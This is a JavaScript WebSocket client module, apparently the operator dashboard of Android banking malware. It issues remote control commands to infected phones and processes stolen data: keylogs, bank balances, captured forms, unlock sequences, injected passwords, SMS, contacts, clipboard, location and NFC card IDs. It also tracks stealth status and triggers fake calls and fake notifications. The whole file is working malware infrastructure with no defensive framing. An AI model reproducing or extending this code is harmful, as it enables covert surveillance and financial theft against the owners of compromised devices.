/**
 * OxyWS — WebSocket client v4.6
 *
 * Priority send queue
 * ───────────────────
 * HIGH  commands (TAP, SWIPE, TYPE, KEY, DRAG_*, NAV) are always sent
 *       immediately regardless of buffer state.
 * LOW   everything else (config, subscribes, stats) is dropped when the
 *       WebSocket send buffer exceeds BACKPRESSURE_HI_BYTES.
 *
 * Reconnect backoff: 2s → 4s → 8s → 16s → 30s (max)
 */

import useStore from './store/index.js';

const WS_URL = `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}/dashboard`;
const AUTH   = '';   // set to match server AUTH_TOKEN env if configured

const RECONNECT_MIN_MS = 2_000;
const RECONNECT_MAX_MS = 30_000;
const BACKPRESSURE_HI  = 192 * 1024; // 192 KB — stop LOW-priority sends
const PING_INTERVAL_MS = 20_000;

// Control commands that need sub-frame delivery — bypass backpressure check
const HIGH_PRIORITY = new Set([
  'TAP', 'LONG_PRESS', 'SWIPE', 'DRAG_START', 'DRAG_MOVE', 'DRAG_END',
  'TYPE', 'KEY', 'BACK', 'HOME', 'RECENTS', 'POWER_MENU', 'WAKEUP',
  'LOCK_DEVICE', 'NOTIFICATIONS', 'QUICK_SETTINGS',
]);

class OxyWS {
  constructor() {
    this._ws           = null;
    this._reconnTimer  = null;
    this._pingTimer    = null;
    this._pingStart    = 0;
    this._reconnDelay  = RECONNECT_MIN_MS;
    this._pendingVncId = null;   // device_id for the next arriving binary frame
    this._msgHandlers  = new Set();
    this._binHandlers  = new Set();
  }

  // ── Public ──────────────────────────────────────────────────────────────────
  connect() {
    if (this._ws && this._ws.readyState < 2) return;
    const url = AUTH ? `${WS_URL}?token=${AUTH}` : WS_URL;
    const ws  = new WebSocket(url);
    ws.binaryType = 'arraybuffer';
    this._ws = ws;

    ws.onopen = () => {
      this._reconnDelay = RECONNECT_MIN_MS;
      useStore.getState().setConnected(true);
      useStore.getState().pushEvent({ type: 'sys', text: '🟢 OXY Server conectado', ts: Date.now() });
      clearTimeout(this._reconnTimer);
      clearInterval(this._pingTimer);
      this._pingStart = 0;
      this._pingTimer = setInterval(() => {
        this._pingStart = performance.now();
        this._sendRaw(JSON.stringify({ type: 'ping' }));
      }, PING_INTERVAL_MS);
    };

    ws.onclose = () => {
      useStore.getState().setConnected(false);
      clearInterval(this._pingTimer);
      this._pingTimer = null;
      this._reconnTimer = setTimeout(() => this.connect(), this._reconnDelay);
      this._reconnDelay = Math.min(this._reconnDelay * 2, RECONNECT_MAX_MS);
    };

    ws.onerror = () => ws.close();

    ws.onmessage = (e) => {
      if (e.data instanceof ArrayBuffer) {
        const devId = this._pendingVncId;
        this._pendingVncId = null;
        if (devId) {
          for (const h of this._binHandlers) { try { h(e.data, devId); } catch (_) {} }
        }
        return;
      }
      let msg; try { msg = JSON.parse(e.data); } catch (_) { return; }
      for (const h of this._msgHandlers) { try { h(msg); } catch (_) {} }
      this._dispatch(msg);
    };
  }

  /** Send a command to a device — always HIGH priority (control commands). */
  command(deviceId, action, params = {}) {
    this._sendImmediate(JSON.stringify({ type: 'command', device_id: deviceId, action, ...params }));
  }

  /**
   * General send — routes by action priority.
   * Commands with HIGH_PRIORITY action bypass the backpressure check so
   * TAP/SWIPE/DRAG reach the device even when the VNC stream is saturating
   * the socket buffer. Everything else is dropped cleanly when congested.
   */
  send(msg) {
    const str    = typeof msg === 'string' ? msg : JSON.stringify(msg);
    const action = (typeof msg === 'object' ? msg?.action : null)
                ?? (() => { try { return JSON.parse(str)?.action; } catch (_) { return null; } })();
    if (action && HIGH_PRIORITY.has(action)) {
      this._sendImmediate(str);
    } else {
      this._sendBuffered(str);
    }
  }

  subscribe(stream, deviceId) {
    this._sendImmediate(JSON.stringify({ type: `subscribe_${stream}`, device_id: deviceId }));
  }

  unsubscribe(stream, deviceId) {
    this._sendImmediate(JSON.stringify({ type: `unsubscribe_${stream}`, device_id: deviceId }));
  }

  onMessage(handler) {
    this._msgHandlers.add(handler);
    return () => this._msgHandlers.delete(handler);
  }

  onBinary(handler) {
    this._binHandlers.add(handler);
    return () => this._binHandlers.delete(handler);
  }

  get bufferedAmount() { return this._ws?.bufferedAmount ?? 0; }
  get readyState()     { return this._ws?.readyState ?? WebSocket.CLOSED; }

  // ── Internals ───────────────────────────────────────────────────────────────

  /** Always sends — for HIGH priority control messages. */
  _sendImmediate(str) {
    if (this._ws?.readyState === WebSocket.OPEN) {
      try { this._ws.send(str); } catch (_) {}
    }
  }

  /** Sends only if buffer is below threshold — for LOW priority messages. */
  _sendBuffered(str) {
    if (this._ws?.readyState === WebSocket.OPEN &&
        this._ws.bufferedAmount < BACKPRESSURE_HI) {
      try { this._ws.send(str); } catch (_) {}
    }
  }

  _sendRaw(str) { this._sendImmediate(str); }

  _dispatch(msg) {
    const store = useStore.getState();

    switch (msg.type) {
      case 'pong':
        if (this._pingStart) store.setLatency(Math.round(performance.now() - this._pingStart));
        this._pingStart = 0;
        break;

      case 'device_list':
        store.mergeDeviceList(msg.devices || []);
        break;

      case 'online_set':
        store.setOnlineIds(msg.device_ids || []);
        break;

      case 'stats':
        store.setStats(msg.data || {});
        break;

      case 'device_online':
        store.markOnline(msg.device_id);
        store.upsertDevice({ device_id: msg.device_id, is_online: 1, ip_address: msg.ip || '' });
        store.pushEvent({ type: 'online', text: `📱 Online: ${msg.device_id}`, ts: msg.ts });
        break;

      case 'device_offline':
        store.markOffline(msg.device_id);
        store.updateDeviceField(msg.device_id, { is_online: 0 });
        store.pushEvent({ type: 'offline', text: `📴 Offline: ${msg.device_id}`, ts: msg.ts });
        break;

      case 'device_info': {
        const d = { ...msg.data, device_id: msg.device_id, is_online: 1 };
        store.upsertDevice(d);
        if (msg.device_id === store.selectedId) store.updateDeviceField(msg.device_id, msg.data);
        break;
      }

      case 'device_status': {
        const fields = {
          current_app: msg.package, current_app_name: msg.appName,
          is_locked: msg.isLocked ? 1 : 0, is_screen_on: msg.isScreenOn ? 1 : 0,
        };
        if (msg.batteryLevel !== undefined) fields.battery_level = msg.batteryLevel;
        store.updateDeviceField(msg.device_id, fields);
        break;
      }

      case 'vnc_meta':
        // Tag the NEXT arriving binary frame with this device_id
        this._pendingVncId = msg.device_id;
        break;

      case 'vnc_status':
        store.updateDeviceField(msg.device_id, { vnc_active: msg.active ? 1 : 0 });
        if (msg.device_id === store.selectedId) store.setVncActive(msg.active);
        store.pushEvent({ type: 'vnc', text: `🖥 [${msg.device_id}] VNC ${msg.active ? 'ON' : 'OFF'}`, ts: msg.ts });
        break;

      case 'keylog':
        if (msg.device_id === store.selectedId)
          store.appendKeylog({ raw: msg.data, app_context: msg.app || '', ts: msg.ts });
        store.pushEvent({ type: 'keylog', text: `⌨ [${msg.device_id}] ${(msg.data || '').slice(0, 80)}`, ts: msg.ts });
        break;

      case 'keylog_batch':
        store.pushEvent({ type: 'keylog', text: `⌨ [${msg.device_id}] ${msg.count} offline keylogs`, ts: msg.ts });
        break;

      case 'bank_balance':
      case 'form_capture':
        store.pushEvent({ type: 'bank', text: `🏦 [${msg.device_id}] ${msg.bank || '?'}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshBanking();
        break;

      case 'unlock_sequence':
        store.pushEvent({ type: 'unlock', text: `🔓 [${msg.device_id}] ${msg.utype}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshBanking();
        break;

      case 'inject_password':
        store.pushEvent({ type: 'inject', text: `💉 [${msg.device_id}] ${msg.data?.app || '?'}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshBanking();
        break;

      case 'sms_update':
        store.pushEvent({ type: 'cmd', text: `💬 [${msg.device_id}] ${msg.count} SMS`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshSms();
        break;

      case 'contacts_update':
        store.pushEvent({ type: 'cmd', text: `👤 [${msg.device_id}] ${msg.count} contatos`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshContacts();
        break;

      case 'apps_update':
        store.pushEvent({ type: 'cmd', text: `📱 [${msg.device_id}] ${msg.count} apps`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshApps();
        break;

      case 'inject_status':
        if (msg.device_id === store.selectedId) store.setInjectActive(msg.package_name, msg.enabled);
        break;

      case 'stealth_status':
        store.updateDeviceField(msg.device_id, { threat_level: msg.threatLevel || 0 });
        break;

      case 'nfc_scan':
        store.pushEvent({ type: 'nfc', text: `📡 [${msg.device_id}] UID: ${msg.data?.uid || '?'}`, ts: msg.ts });
        break;

      case 'location':
        store.pushEvent({ type: 'loc', text: `📍 [${msg.device_id}] ${msg.lat?.toFixed(5)},${msg.lng?.toFixed(5)}`, ts: msg.ts });
        break;

      case 'command_issued': {
        const tail = msg.queued && !msg.sent ? ' [QUEUED]' : (msg.sent ? ' ✓' : ' ✗');
        store.pushEvent({ type: 'cmd', text: `→ [${msg.device_id}] ${msg.action}${tail}`, ts: msg.ts });
        break;
      }

      case 'fake_call_status':
        store.pushEvent({ type: 'cmd', text: `📞 [${msg.device_id}] ${msg.status} — ${msg.callerName || ''}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshFakeCalls();
        break;

      case 'fake_notification_status':
        store.pushEvent({ type: 'cmd', text: `🔔 [${msg.device_id}] ${msg.status}`, ts: msg.ts });
        if (msg.device_id === store.selectedId) store.refreshNotifications();
        break;

      case 'queue_flushed':
        store.pushEvent({ type: 'cmd', text: `⚡ [${msg.device_id}] ${msg.count} offline cmds flushed`, ts: msg.ts });
        break;

      case 'clipboard':
        store.pushEvent({ type: 'cmd', text: `📋 [${msg.device_id}] ${(msg.text||'').slice(0, 60)}`, ts: msg.ts });
        break;

      default:
        break;
    }
  }
}

export const ws = new OxyWS();
